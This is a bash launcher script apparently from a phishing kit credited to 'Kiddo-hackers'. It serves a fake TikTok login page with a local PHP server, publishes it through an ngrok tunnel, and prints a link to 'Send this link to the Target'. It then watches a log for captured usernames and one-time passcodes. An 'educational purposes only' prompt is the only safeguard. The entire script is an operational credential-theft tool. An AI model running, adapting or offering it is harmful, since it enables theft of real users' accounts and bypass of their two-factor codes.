#!/bin/bash
#--------------------------for all script copy writting Kiddo-hackers------------------
#---------------------------------------<GOOD-LUCK>------------------------------------
clear
./Logo.sh
echo ""
printf "\e[1;33m[\e[0m <<>> \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
sleep 4
echo ""
clear
./Logo.sh
echo ""
read -p $'\e[1;32m\e[0m\e[1;32mT H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
echo ""
./Logo.sh
cd sites/
         cd tiktok/
         echo ""
         echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
         sleep 3
         echo ""
         echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
         ./ngrok http 4444 > /dev/null 2>&1 &
         sleep 25
         echo ""
         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
         printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;31m %s\e[0m\n" $link
         echo ""
         echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
         echo -e $'\e[96m'
         tail -f log.txt | grep -e "username" -e "otp"
